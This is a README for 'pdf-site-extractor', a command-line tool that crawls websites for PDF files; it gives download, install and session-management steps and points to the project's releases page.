# ğŸ“„ pdf-site-extractor - Extract PDFs from Websites Easily

## ğŸš€ Getting Started

Welcome to pdf-site-extractor! This tool helps you crawl websites and extract PDF files effortlessly. You can manage your sessions interactively, making your PDF extraction smooth and user-friendly.

## ğŸ“¥ Download the Application

[![Download pdf-site-extractor](https://img.shields.io/badge/Download%20pdf--site--extractor-v1.0-brightgreen)](https://github.com/Noman9000/pdf-site-extractor/releases)

To get started, you will need to download the software. Click the button above to visit the Releases page. 

## ğŸ–¥ï¸ System Requirements

Before downloading, ensure your computer meets these basic requirements:

- Operating System: Windows, macOS, or Linux
- Python: Version 3.6 or higher installed on your machine
- Internet connection for crawling websites

## ğŸ“– Features

- **Interactive Command Line Interface (CLI)**: Navigate through options easily and enjoy a user-friendly experience.
- **Session Management**: Organize multiple sessions and resume them whenever you need to.
- **Dependency Management**: The tool uses UV-based management for smooth installations.

## ğŸ“š Installation Instructions

1. **Visit the Releases Page**:
   Go to the [Releases page](https://github.com/Noman9000/pdf-site-extractor/releases) to find the latest version.

2. **Download the Application**:
   Locate the most recent release. Select the appropriate file for your operating system to download.

3. **Run the Installer**:
   Once the download is complete, locate the file on your computer and double-click it to run the installer.

4. **Follow Installation Prompts**:
   Complete the installation process by following the on-screen instructions. 

## ğŸ› ï¸ How to Use pdf-site-extractor

After installation, launch the application from your programs menu or desktop shortcut. Hereâ€™s a quick guide on how to use the software:

1. **Open Command Line**: Launch the tool by opening your command line interface (CLI).
2. **Start a New Session**: Type in `start session` to create a new extraction session.
3. **Enter the Website URL**: Input the URL of the website you wish to crawl for PDFs.
4. **Choose Options**: Select from the interactive options to set extraction preferences, like saving options or specific directories.
5. **Start Crawling**: Type `extract` to begin crawling the website and extracting PDFs.

## ğŸ“ Managing Your Sessions

You can manage your sessions effectively with these commands:

- **List Sessions**: To view all active sessions, use the command `list sessions`.
- **Resume a Session**: To return to an existing session, type `resume [session name]`.
- **End Session**: Use `end session` when youâ€™re done with your work.

## ğŸ’¡ Tips for Efficient Use

- Always check the website's terms of service before crawling.
- Organize your extracted PDFs into separate folders to avoid confusion.
- Regularly update the tool to enjoy the latest features and improvements.

## ğŸ”„ Update the Software

To keep your experience smooth, regularly check for updates on the [Releases page](https://github.com/Noman9000/pdf-site-extractor/releases). Updated versions may have new features or important fixes. 

## ğŸ“ Support

If you encounter issues or have questions, feel free to reach out through the GitHub repositoryâ€™s Issues section. The community and maintainers are here to help.

## ğŸ“œ License

This project is open-source and available to use under the MIT License. For more details, please check the license file in the repository.

## ğŸ”— Additional Resources

For further reading and tips, you can refer to the following:

- [Python Documentation](https://docs.python.org/3/)
- [Beautiful Soup 4 Documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
- [GitHub Guides](https://guides.github.com/)

Feel free to explore and enjoy the power of automated PDF extraction with pdf-site-extractor!